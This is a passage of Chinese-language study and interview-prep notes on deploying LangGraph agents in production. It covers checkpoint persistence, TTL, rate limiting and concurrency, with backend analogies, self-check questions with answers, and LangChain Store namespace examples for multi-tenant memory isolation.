      - POSTGRES_PASSWORD=pass
    volumes:
      - pgdata:/var/lib/postgresql/data  # 数据持久化
    # 🟢 官方建议高读写场景：4 CPU / 16Gi+ 

  # —— Redis：只存 ephemeral 信号 + pubsub ——
  redis:
    image: redis:7-alpine
    # 🟢 官方原文："stores only ephemeral data-no user or run data persists in Redis"
    # 不需要持久化，重启丢信号无所谓

volumes:
  pgdata:
```

#### 生产注意（坑 + 对策，表格或列表）

| 坑 | 症状 | 对策 | 来源 |
|----|------|------|------|
| **checkpoint 存储爆炸** | Postgres 磁盘 90%+，查询变慢 | 配 `checkpointer.ttl`（strategy=delete, default_ttl=30天）+ durability=exit（短任务）| 🟢 persistence 页 + configure-ttl 页 |
| **TTL 不清理旧数据** | 配了 TTL 但老 thread 还在 | TTL 只对新创建的 thread 生效，老数据手动删 | 🟢 configure-ttl 页原文 |
| **MemorySaver 重启丢数据** | 进程重启后对话全忘 | 生产用 PostgresSaver，不用 InMemorySaver/MemorySaver | 🟢 persistence 页原文 |
| **PostgresSaver thread_id 太长** | 数据库报错 column too long | thread_id < 255 字符，用 UUID | 🟢 persistence 页原文 |
| **递归爆栈** | Agent 卡在 tool 循环，烧 token | recursion_limit=25（默认）+ 监控 GraphRecursionError | 🟢 pregel 页 + 🟢 万物云口径 |
| **并发写冲突** | 同一 thread 两个 run 互相覆盖 checkpoint | Agent Server 内置 1-run-per-thread / 自托管用 Redis 锁 | 🟢 agent-server 页 |
| **LLM 429 限流** | 高并发时 API 全线 429 崩溃 | RateLimiter + .with_retry() + max_concurrency 三层防护 | 🟢 handle-model-rate-limiting 页 |
| **同步阻塞 event loop** | worker 卡住，run 超时 | 避免 sync 阻塞操作，用 async/await 或 asyncio.to_thread() | 🟢 agent-server-scale 页原文 |
| **轮询打爆 API** | 客户端轮询 /state，QPS 暴涨 | 用 /join（等完成）或 /stream（SSE 实时推送），别轮询 | 🟢 agent-server-scale 页原文 |
| **冷启动慢** | 新版本部署后第一个请求慢 | 用 compiled graph（不用 factory function），容器启动时加载一次 | 🟢 agent-server 页原文 |
| **DeltaChannel 剪枝丢数据** | prune 后 state 重建为空 | 不要删 delta chain 依赖的 write rows，或 force snapshot before pruning | 🟢 checkpointers 页原文 |
| **worker 全挂 run 孤儿** | queue worker 全死，run 永远 pending | 至少保 1 个 worker 活着 + 告警 | 🟢 agent-server 页原文 |

**灰度/回滚补充**：
- 灰度：Agent Server 支持 revision（版本），可以 redeploy revision 回滚到旧版本 🟢（API reference 页）
- 回滚 double-texting 策略：rollback 策略需要 checkpointer 实现 `adelete_for_runs` 方法 🟢（checkpointers 页 Extended capabilities 表）
- 灰度新 prompt：用 assistant version，流量切一部分到新版本 🟡（通用网文）

#### 后端类比（表格：Agent概念 | 后端类比(Spring/Activiti/Redis/JUC) | 说明）

| Agent 概念 | 后端类比 | 说明 |
|------------|----------|------|
| API Server | Spring Boot @RestController | 只接 HTTP 请求，不做业务逻辑，转发给后端 |
| Queue Worker | Activiti Job Executor / Spring @Async 线程池 | 真正跑任务（graph）的执行引擎 |
| Postgres (checkpoint) | Activiti ACT_RU_EXECUTION / ACT_HI_ACTINST | 持久化流程实例状态，重启可恢复 |
| Redis (ephemeral + pubsub) | Redis pub/sub + SseEmitter | 传递实时信号，不存业务数据 |
| thread_id 串行（1 run per thread） | Activiti processInstanceId 唯一执行链 | 同一流程实例同时只有一条执行路径 |
| double-texting reject (409) | JUC ReentrantLock.tryLock() 返回 false | 拿不到锁就拒绝，不阻塞 |
| double-texting enqueue | JUC LinkedBlockingQueue.put() | 排队等前面跑完 |
| double-texting interrupt | Thread.interrupt() + 保存现场 | 暂停当前，插入新的，恢复时从中断点继续 |
| double-texting rollback | @Transactional rollback + 重新开始 | 回滚所有进度，从头跑 |
| recursion_limit=25 | Activiti async job retry count / Spring @Retryable maxAttempts | 步数上限，防爆栈止损 |
| durability="sync" | Spring 同步事务提交（commit 后才返回） | 最安全最慢 |
| durability="async" | Spring @Async + write-behind cache | 异步写，性能好，有小窗口丢数据风险 |
| durability="exit" | 只在方法结束时写一次 DB | 短任务用，中间步骤不存 |
| checkpointer TTL | Redis EXPIRE / Activiti History Cleanup Job | 定时清理过期数据 |
| DeltaChannel | Spring @Version 乐观锁增量 / Git delta diff | 只存增量，不存全量 |
| InMemoryRateLimiter | Guava RateLimiter / Sentinel / Bucket4j | 令牌桶限流，客户端控制 |
| .with_retry() | Spring @Retryable + ExponentialBackoffPolicy | 指数退避重试 |
| max_concurrency | JUC Semaphore permits | 限制并发数 |
| N_JOBS_PER_WORKER | ThreadPoolExecutor corePoolSize | 单 worker 并发处理数 |
| available_jobs = workers × N_JOBS | 线程池总容量 = corePoolSize × 实例数 | 集群总并发 |
| Redis 分布式锁（自托管） | Redisson RLock.tryLock() | SET NX EX + Lua CAS 释放 |
| Agent Server revision | Spring Boot 版本号 / K8s Deployment rollout | 版本管理 + 回滚 |

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

| 维度 | 万物云口径 | 来源 |
|------|-----------|------|
| recursion_limit | =25，框架内置兜底，调了阈值 🟢 | 🟢 万物云确认 |
| concurrent-run hard protection | 自托管加自己 Redis 锁（不用 Agent Server 内置的 double-texting）🔴 | 🔴 推断（未明确说用 Agent Server） |
| checkpointer TTL | 配了 TTL 🟢 | 🟢 万物云确认 |
| 长期记忆 | pgvector + similar merge + TTL 🟢（不是 RedisStore / 不是 Deep Agents AGENTS.md） | 🟢 万物云确认 |
| 框架 | StateGraph + create_agent 自建，没用 Deep Agents 🟢 | 🟢 万物云确认 |
| 人工审核 | interrupt_before（静态）🟢 | 🟢 万物云确认 |
| MCP | 自建（非官方 SDK）🟢 | 🟢 万物云确认 |
| 可观测性 | RAGAS / Langfuse / LangSmith 只"了解"没用 🟢 | 🟢 万物云确认 |
| double-texting 四策略 | 🔴 不编（万物云自托管，如果没用 Agent Server 则没有这四策略；用了 Redis 锁实现 reject 等价语义）| 🔴 待核 |
| DeltaChannel | 🔴 不编（没明确说用没用，beta 阶段）| 🔴 待核 |
| 部署模式 | 🔴 不编（没明确说是 single host 还是 split API+queue）| 🔴 待核 |
| durability 模式 | 🔴 不编（没明确说用 sync/async/exit 哪个）| 🔴 待核 |

**万物云口径关键点**：万物云自托管 LangGraph（StateGraph + create_agent），不是 LangSmith Cloud。recursion_limit 用框架默认 25 🟢。concurrent-run 保护是自己加 Redis 锁 🔴（因为如果没用 Agent Server，框架本身没有 double-texting 四策略 🟢）。checkpointer 存储膨胀用 TTL 控制 🟢。长期记忆用 pgvector + TTL 🟢，不是 Deep Agents 的 AGENTS.md 机制。

#### 第32步检查题（5道，含预判疑问）

**第1题**：你的 Agent 上线后发现 Postgres 磁盘每天涨 5GB，查发现是 checkpoint 表暴涨。你配了 `checkpointer.ttl.default_ttl=43200`（30天），但部署后磁盘还在涨。可能的原因是什么？怎么解决？

> **预判疑问**：配了 TTL 为什么不生效？
> **答案要点**：🟢 TTL 只对配置部署后**新创建**的 thread 生效，老 thread 的 checkpoint 不会被清理。解决：①手动删老数据（DELETE FROM checkpoints WHERE created_at < ...）；②等老数据自然到期（如果你配了 TTL 后创建的 thread，30 天后会被 sweeper 清理）；③同时降 durability 到 exit/async 减少新增 checkpoint 量；④长对话用 DeltaChannel（beta）减少单条 checkpoint 体积。

**第2题**：用户反馈"Agent 回复到一半被截断"，日志显示 `GraphRecursionError`。这是什么错误？你会怎么处理？

> **预判疑问**：recursion_limit 是什么？怎么调？调高有风险吗？
> **答案要点**：🟢 recursion_limit 是 Pregel 运行时的 super-step 步数上限（默认 25）。超过就抛 GraphRecursionError，graph 停止。处理：①先看是不是 agent loop 卡死（tool 报错→model 重试循环），如果是，修 tool 的错误处理，别让 model 无限重试；②如果确实是长链推理需要更多步，调高 `config={"recursion_limit": 50}`；③调高有风险：更多步 = 更多 token 消耗 + 更长延迟，要配合监控和成本告警。万物云口径："用框架自带的兜底并调了阈值"🟢。

**第3题**：同一用户在 1 秒内连发两条消息，你的 Agent 会出现什么问题？Agent Server 的四种 double-texting 策略分别怎么处理？如果你不用 Agent Server（自托管 OSS LangGraph），你怎么实现并发隔离？

> **预判疑问**：double-texting 是 OSS 的还是 Agent Server 的？自托管怎么办？
> **答案要点**：🟢 同一 thread_id 同时两个 run，会互相覆盖 checkpoint，状态撕裂。🟢 四策略：enqueue（默认，排队）、reject（409 拒绝）、interrupt（暂停第一个，插入第二个）、rollback（回滚第一个，从头跑第二个）。🟢 **关键**：double-texting 是 LangSmith Agent Server 的功能，**不是 OSS LangGraph 的**。自托管 OSS 没有这个功能，要自己实现：用 Redis 分布式锁（SET NX EX + Lua CAS 释放），同一个 thread_id 拿不到锁就 reject（返回 409）。万物云就是自托管加 Redis 锁 🔴。

**第4题**：你的 Agent 高并发时 LLM API 返回大量 429（Rate Limit），全线崩溃。官方文档给了哪三种限流手段？各管什么？

> **预判疑问**：三种手段分别在哪一层？
> **答案要点**：🟢 三种：①InMemoryRateLimiter（客户端令牌桶，控制发往 LLM 的请求速率，requests_per_second + max_bucket_size）；②.with_retry(stop_after_attempt=N)（指数退避重试，429 时自动重试，递增等待）；③max_concurrency（并发上限，限制同时发出的请求数）。三层从不同角度防护：RateLimiter 管速率、retry 管容错、max_concurrency 管并发数。类比：Sentinel 限流 + Spring @Retryable 重试 + JUC Semaphore 并发控制。

**第5题**：Agent Server 的部署架构有哪几个组件？API Server 和 Queue Worker 的职责分别是什么？为什么说容器是 stateless 的？`available_jobs` 怎么算？

> **预判疑问**：为什么 API 和 Worker 要分开？stateless 意味着什么？
> **答案要点**：🟢 四组件：API Server（接 HTTP 请求）+ Queue Worker（跑 graph 代码）+ Postgres（存所有持久数据：thread/run/checkpoint/store）+ Redis（存 ephemeral 信号 + pubsub）。🟢 API Server 不跑 graph 代码，只创建 run、读 thread state、转发 SSE；Queue Worker 才跑 graph 代码、写 checkpoint。🟢 容器 stateless = 数据全在 Postgres + Redis，容器本身不存状态，扩容缩容不丢数据。🟢 `available_jobs = number_of_queue_workers × N_JOBS_PER_WORKER`，`throughput = available_jobs / avg_run_time`。分开的原因：API 和 Worker 职责不同，扩容维度不同（API 按读 QPS 扩，Worker 按 run 积压数扩），独立扩容更高效。

#### 第18步补充：Store 到底是什么（讲透）

> 用户反馈：Store 一句话带过没讲透。重讲。

**Store 是什么**

Store 是 LangChain 的**键值存储接口**（`BaseStore` 抽象类），专门存跨会话的长期数据。跟 checkpointer 一样是"持久化"，但用途完全不同（区别在下面，这是重点）。

**具体实现（后端选一个）**：
- `InMemoryStore`：存内存，开发测试用，重启就没（类比 HashMap）
- `RedisStore`：存 Redis，生产用，持久化（类比生产 Redis）
- 还有本地文件等

**API（就是 CRUD）**：
```python
from langchain.store.memory import InMemoryStore
store = InMemoryStore()  # 开发；生产用 RedisStore

# 写：存用户画像
store.put(
    namespace=("user", "zhang_san"),   # 命名空间
    key="profile",
    value={"vip": True, "address": "深圳市南山区xxx", "prefers": "先查物流"}
)

# 读：取用户画像
profile = store.get(("user", "zhang_san"), "profile")
# {"vip": True, "address": "...", ...}

# 删
store.delete(("user", "zhang_san"), "profile")
```

**namespace 是啥**：`("user", "zhang_san")` 是命名空间，类比**表名 + 主键前缀** / Redis key 前缀。一个命名空间下可以有多个 key（profile / history / preferences...），作用是分组隔离，不同用户数据不串。

**后端类比**：

| Store 概念 | 后端类比 |
|---|---|
| Store 整体 | 一个 KV 数据库 / Redis（你主动读写，跟会话无关） |
| namespace | 表名+主键 / Redis key 前缀 |
| put/get/delete | CRUD |

**Store vs checkpointer（重点，别混）**--两者都"持久化"但用途完全不同：

| | checkpointer | Store |
|---|---|---|
| 存什么 | agent 的 state（含 messages），版本化 | 任意 KV 业务数据 |
| 绑定什么 | 绑定一个 thread（会话） | 不绑定会话，跨所有会话 |
| 谁存取 | 框架自动存自动取（graph 执行时） | 你主动写主动读 |
| 用途 | "这个会话跑到哪了，能恢复" | "记住张三是 VIP，跨他所有会话" |
| 后端类比 | session 状态持久化（HttpSession 存 Redis） | 用户画像表/Redis（独立业务数据） |

一句话：**checkpointer 是会话状态，Store 是业务数据。**

**为什么有 checkpointer 还要 Store**：
- checkpointer 存"这个 thread 的对话状态"，thread 过期后不一定还用
- "张三是 VIP"这种事实，跨张三的**所有会话**都要记住，是业务数据不是会话状态
- 所以需要独立的 Store 存跨会话业务数据

**万物云实际**：长期记忆用 pgvector（Postgres 向量扩展）+ 相似合并 + TTL 淘汰（源文档 08，非 RedisStore）；用户首次交互写画像 `store.put(...)`；对话时 before_model 读 `store.get(...)` 注入。

#### 第18步补充二：Store 实际怎么用（完整端到端代码）

> 用户反馈：给了 put/get/delete API 但没给"实际怎么接到 agent 里用"。补完整例子。

**先确认**：Store 就是长期记忆**落库持久化的地方**。长期记忆不是飘在空中的概念，数据就存在 Store 里（生产后端如 RedisStore / pgvector，万物云用 pgvector）。"长期记忆 = Store 里存的数据 + 主动检索注入的机制"两部分。

**完整端到端代码**：

```python
from langchain.chat_models import init_chat_model
from langchain.agents import create_agent
from langchain.agents.middleware import Middleware   # 中间件基类
from langchain.store.memory import InMemoryStore      # 开发；生产用 RedisStore
from langchain_core.messages import SystemMessage

# ============ 1. 建 Store（长期记忆的库）============
store = InMemoryStore()   # 生产：RedisStore(redis_url="redis://...")

# 某处把用户画像写进 Store（用户首次注册/首次交互时写一次）
store.put(
    namespace=("user", "zhang_san"),
    key="profile",
    value={"vip": True, "address": "深圳市南山区xxx", "prefers": "催单先查物流"}
)

# ============ 2. 写个 Middleware：每轮调模型前从 Store 读画像注入 ============
class ProfileInjectionMiddleware(Middleware):
    def before_model(self, state, model_call):
        user_id = state.get("user_id", "zhang_san")
        profile = store.get(("user", user_id), "profile")   # 主动检索长期记忆
        if profile:
            state["messages"] = [
                SystemMessage(content=f"用户画像：{profile}，回复时参考")
            ] + state["messages"]
        return state

# ============ 3. 建 Agent：把 store 和 middleware 都传进去 ============
agent = create_agent(
    model=init_chat_model("openai:gpt-4o"),
    tools=[...],
    system_prompt="你是万物云客服...",
    store=store,                                # ← Store 传进来（长期记忆库）
    middleware=[ProfileInjectionMiddleware()],  # ← 注入中间件
)

# ============ 4. 跑起来 ============
result = agent.invoke({
    "messages": [{"role": "user", "content": "帮我催下订单"}],
    "user_id": "zhang_san"   # 通过 state 传 user_id，middleware 靠它去 Store 查
})
```

**流程串起来**（对照 4 步）：
1. 建 Store + 提前 `put` 用户画像（落库）--长期记忆**怎么存**
2. `ProfileInjectionMiddleware.before_model`：每轮调模型前用 user_id 去 Store `get` 画像，塞到 messages 最前--长期记忆**怎么取/注入**
3. `create_agent` 把 `store` 和 `middleware` 都传进去--Store 供 middleware 读写，middleware 挂在 agent 循环上
4. invoke 时通过 state 传 `user_id`，middleware 靠它知道查哪个用户

"主动检索注入"完整链路 = before_model 钩子里 `store.get()` 读 → 拼成 SystemMessage → insert 到 messages 最前。每轮模型调用前都跑，模型始终看到这个用户的画像。

**两个关键点**：
- Store 是**你主动读写**的（put 在别处写，get 在 middleware 读），不是框架自动的--跟 checkpointer（框架自动存取）相反
- `user_id` 通过 state 传进来，是连接"当前会话"和"Store 里这个用户的长期记忆"的钥匙

#### 第18步补充三：namespace 详解 + 多租户隔离（个人空间/团队空间/身份轴漂移）

> 用户追问 namespace 是 Store 的什么参数，并提到"个人空间/团队空间/单轴隔离/身份轴漂移"。展开。

**namespace 是 Store 的什么参数**

namespace 是 `put` / `get` / `delete` / `search` 的**第一个参数**，一个**字符串元组**。给数据分组隔离，同一个 key 在不同 namespace 下是不同数据，互不干扰。

```python
store.put(namespace=("user", "zhang_san"), key="profile", value={...})
store.get(("user", "zhang_san"), "profile")          # 取这个 namespace 下的 profile
store.search(("user", "zhang_san"))                   # 搜这个 namespace 下所有 key
```

源文档 07 里用的是 `namespace=("user_preferences", user_id)`，也是这个结构：前缀 + id。

**为什么是元组不是单个字符串**：元组天然支持**层级**，像路径。`("user", "zhang_san")` = `/user/zhang_san`，可以更深 `("user", "zhang_san", "memories", "2026-07")`，每段一个维度，便于按维度检索/过滤。

**个人空间 / 团队空间 / 项目空间（多租户隔离模式）**

C 端/B 端 agent 常见的多租户记忆隔离设计，靠 namespace 区分：

| 空间 | namespace | 存什么 | 谁能看 |
|---|---|---|---|
| 个人空间 | `("user", uid)` | 用户私有偏好/历史 | 只有这个用户 |
| 团队空间 | `("team", team_id)` | 团队共享文档/偏好 | 团队成员 |
| 项目空间 | `("project", project_id)` | 项目级记忆 | 项目成员 |

场景：一个用户既有自己的个人空间（私人偏好），又在某个团队里共享团队空间（团队文档、团队话术）。

**单轴隔离（每次查询沿一个身份轴）**

每次检索明确"这次以什么身份查"，**一次查询只走一个轴**，不混：
- 用户问"我的偏好" → 查 `("user", uid)`
- 用户问"团队文档" → 查 `("team", team_id)`
- 不会一个查询同时混 user 轴和 team 轴

**身份轴漂移（axis drift）--要避免的坑**

漂移 = 查询时身份轴搞混，数据串台。几种情况：
- **轴搞错**：本该查个人空间 `("user", uid)`，查成了 `("team", team_id)`，把团队偏好当个人偏好注入，回答串了
- **跨用户泄露（最严重）**：namespace 没带对 user_id（硬编码或取错），查到别人的记忆--用户 A 看到用户 B 的偏好
- **漏查**：用户 A 在团队 T 里，本意查团队记忆却查了 `("user", "A")`，只看到 A 个人记忆没看到团队共享的

后端类比：这就是 **SaaS 多租户系统里 SQL 忘带 `tenant_id` WHERE 条件，导致跨租户数据泄露**--多租户最经典的安全 bug。namespace 就是 agent 记忆的 tenant_id。

**怎么防身份轴漂移**
- 每次检索从 state 取 user_id / team_id 拼成 namespace，不硬编码：
```python
def before_model(self, state, model_call):
    user_id = state["user_id"]          # 从 state 取，不硬编码
    team_id = state.get("team_id")      # 团队场景才取
    profile = store.get(("user", user_id), "profile")   # 明确查 user 轴
    ...
```
- 一个查询只走一个轴，身份切换时 namespace 轴跟着切
- 后端类比：每个 SQL 强制带 `tenant_id` WHERE（ORM 拦截器自动注入 tenant_id）

**后端类比总表**

| Store namespace 概念 | 后端类比 |
|---|---|
| namespace 元组 | 表名+主键前缀 / Redis key 前缀 / 文件路径 |
| 个人空间 `("user", uid)` | 用户表按 user_id 隔离 |
| 团队空间 `("team", team_id)` | 团队表按 team_id 隔离 |
| 单轴隔离 | 每次查询带一个身份维度 |
| 身份轴漂移 | SQL 忘带 tenant_id 跨租户泄露 |
| 防漂移（从 state 取 id） | ORM 拦截器自动注入 tenant_id |

**万物云场景**：C 端客服主要是个人空间 `("user", uid)` 存用户画像；如果服务企业客户（B 端），加企业空间 `("org", org_id)` 存企业配置。关键风险：用户身份切换（个人 vs 代表团队）时 namespace 轴要跟着切，否则串。

> ⚠️ **修正**：本步前面说"万物云生产用 RedisStore"，但源文档 08 写的是"长期记忆用 **pgvector** + 相似合并 + TTL 淘汰"。以源文档为准：万物云长期记忆用 pgvector（Postgres 向量扩展）做语义检索 + 相似合并 + TTL 淘汰。pgvector 这块面试要能讲清表结构/相似合并/TTL 细节，跟 PostgresSaver 一样有被追问翻车的风险。
